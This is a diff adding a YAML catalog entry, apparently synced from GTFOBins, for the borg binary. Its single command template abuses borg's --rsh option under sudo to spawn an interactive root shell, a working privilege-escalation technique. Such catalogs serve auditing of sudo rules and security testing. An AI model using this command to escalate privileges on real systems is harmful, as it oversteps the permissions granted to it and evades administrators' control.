@@ -1,0 +1,24 @@
+id: gtfobins/borg/shell/sudo
+type: binary
+platform: linux
+name: borg
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'borg extract @:/::: --rsh "/bin/sh -c ''/bin/sh </dev/tty >/dev/tty 2>/dev/tty''"'
+references:
+- https://gtfobins.github.io/gtfobins/borg/
+tags:
+- linux
+- unix
+- gtfobins
